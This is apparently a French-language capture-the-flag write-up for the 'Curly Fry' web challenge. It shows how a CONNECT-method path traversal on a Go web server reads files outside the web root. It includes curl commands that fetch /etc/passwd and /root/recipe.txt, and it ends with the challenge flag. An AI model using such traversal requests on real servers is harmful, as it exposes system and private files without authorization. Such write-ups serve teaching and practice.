# Patriot CTF

## Web

### Curly Fry

**Dificulté :** Facile

**Enoncé :** Qui a besoin de Flask quand vous avez Golang -- la nouvelle méta pour les applications web.

Jetez un coup d'oeil à ce site web super élégant et fonctionnel.

***

A la connexion sur cette URL, on tombe sur la page **index.hmtl** avec le code source suivant :

```html
<html>
  <head>
    <title>Curly Fry</title>
  </head>
  <body>
    <h2>I will release my secret curly fry recipe when I am ready. For now it is safely held in my /root directory</h2>
  </body>
</html>
```

On se doutes donc qu'il faut accéder à un fichier dans le répertoire **/root**.

Il existe un exploit qui permet d'accéder à des ressources non-autorisées grâce à une requête CONNECT sur des serveurs web en Golang.

J'essaye dans un premier temps d'accéder au fichier **/etc/passwd** via curl : `curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../..
/etc/passwd`

Via la requête, j'accède bien au fichier souhaité :

![image](https://user-images.githubusercontent.com/49941629/166076146-30bb3dff-12a2-4c41-b867-73f19eb2b62b.png)

Ceci dit, impossible d'exécuter une commande pour lister le contenu du répertoire /root.

Après relecture ducode source HTML, je découvre l'existence du fichier recipe.txt. 

Je relance donc ma commande curl avec le chemin complet et je récupère le contenu : `curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../root/recipe.txt`

![image](https://user-images.githubusercontent.com/49941629/166076128-1acaa89b-ad4e-4c55-900e-5062165d01f0.png)

FLAG : PCTF{tru5t_m3_im_4_ch3f}
